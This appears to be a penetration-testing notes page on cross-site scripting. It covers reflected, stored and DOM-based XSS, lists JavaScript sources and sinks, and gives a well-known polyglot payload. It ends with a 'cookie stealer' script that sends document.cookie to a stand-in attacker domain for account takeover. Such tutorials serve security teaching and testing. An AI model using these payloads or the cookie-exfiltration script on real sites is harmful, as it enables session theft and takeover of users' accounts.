---
description: >-
  Stealing user cookies for account takeover is much better than popping an
  alert box.
---

# XSS

#### There are three types of XSS vulnerabilities reflected, stored, and DOM.

## <mark style="color:yellow;">Reflected</mark>&#x20;

User input is reflected in the html source, If done improperly an attacker could insert malicious payloads into the page.

#### Input Field

Just because your payload is reflected in the page doesn't mean it will immediately trigger, you might have to break out of a few tags to get the payload to work properly.

#### Event Attributes

applied to HTML tags for the execution of Javascript when certain events occur, for example, onclick, onblur, onmousehover, etc.

* by using them, we don’t need “<” or “>” tags.

EX: "Onfocus" event attr:

* When a user focuses on this input tag, the function will execute and an alert box will appear.

## <mark style="color:yellow;">Stored</mark>

#### What distinguishes stored XSS from reflected XSS?&#x20;

* stored XSS will be permanently stored somewhere while reflected XSS is not.

The XSS payload is stored in a (Database, JSON file, and XML File) and retrieved by the application.

* once a user visits the vulnerable endpoint the XSS payload will be retrieved and executed by the application.

#### Popular places to store user input:

* Email, Username, BIO, Address, Comments, Images, and Links.

## <mark style="color:yellow;">DOM Based</mark>

💡Note, If a javascript function is passed to the eval function it will be automatically executed before the eval function is run.

#### What distinguishes DOM-based from stored XSS and reflected XSS?&#x20;

* it happens client-side entirely within the browser.
* spotted by looking at the JavaScript source code.

When performing a code review people generally look for user-supplied input (source) and track it through the program until it gets executed (sink).

#### illustration

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption><p>Dom Based</p></figcaption></figure>

#### Sources

💡If the source is being paced to a dangerous sink you could have XSS.

A list of javascript sources can be modified by the user:

* document.URL, location.hash, Document.cookie, Location.pathname, location.href, location, document.baseURI, and document.documentURI

#### Sinks

The sinks are meant to be the points in the flow where data depending on sources is used in a potentially dangerous way resulting in the loss of the CIA triad.

If user-supplied input(source) is ever passed to a dangerous sink you probably have DOM-based XSS.

#### A list of dangerous sinks

<table><thead><tr><th width="237">Sink</th><th>Example</th></tr></thead><tbody><tr><td>Eval</td><td>eval(“Javascript Code” + alert(0))</td></tr><tr><td>Function</td><td>function(“Javascript Code” + alert(0))</td></tr><tr><td>SetTimeout</td><td>settimeout(“Javascript Code” + alert(0),1)</td></tr><tr><td>SetInterval</td><td>setinterval(“Javascript Code” + alert(0),1)</td></tr><tr><td>Document.write</td><td>document.write("html"+ “&#x3C;img src=/ onerror=alert(0)”)</td></tr><tr><td>Element.innerHTML</td><td>div.innerHTML = "htmlString"+ “&#x3C;img src=/ onerror=alert(0)”</td></tr></tbody></table>

## <mark style="color:green;">Polyglot</mark>

When testing for XSS you often have to break out of multiple tags to get a payload to trigger.

A famous XSS polyglot by “0xsobky” it can be used to trigger your xss payload on a multitude of scenarios:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=a lert()//>\x3e
```

## <mark style="color:green;">Cookie Stealer</mark>

Cookies are used to store a user's authentication details.

* If an attacker steals this cookie by send it to the attacker's machine, they will be able to impersonate the victim giving them access to their account.

#### Exploitation

Modifying the “document.location” forcing the browser to navigate to an attackers webpage:

* Document.location = ” http://attacker-domain.com ”

Javascript "Document.cookie" Function used to retrieve a user's cookies.

Combining these two commands to grab the victims cookies and send them to the attackers machine:

```javascript
<script type="text/javascript">document.location='http://attacker-domain/cookiestealer?cookie='+document.cookie; </script> 
```

When the payload was executed it sent the users cookie to our server then cookie used to login as the victim user allowing us to fully compromise their account.

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption><p>victim cookie</p></figcaption></figure>
